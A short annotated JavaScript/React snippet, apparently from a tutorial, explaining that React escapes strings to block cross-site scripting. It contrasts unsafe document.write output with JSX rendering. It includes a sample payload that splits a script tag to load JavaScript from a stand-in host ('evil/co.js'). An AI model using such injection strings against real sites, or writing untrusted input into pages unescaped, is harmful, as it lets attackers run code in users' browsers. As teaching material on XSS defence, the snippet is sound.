/*
React escapes all strings to prevent a class of XSS(cross-site scripting) attacks. 
So when you ask the user to give you some input and they provide a malicious string, 
React protects you. Take this user input, for example:*/

const firstname =
'John<scr'+'ipt src="https://evil/co.js"></scr'+'ipt>';

//Under some circumstances, you may end up writing this into the DOM. For example:
document.write(firstname);

/*This is a disaster, because the page reads “John,” 
but the <script> tag loads a poten‐ tially malicious JavaScript from a third-party web site, 
likely owned by a criminal. This compromises your app and, in turn, the users that trust you.*/

/*React protects you in cases like this out of the box. 
React escapes the content of first name when you do the following*/

function Example() { const firstname =
    'John<scr' + 'ipt src="https://evil/co.js"></scr' + 'ipt>'; return <h2>Hello {firstname}!</h2>;
    }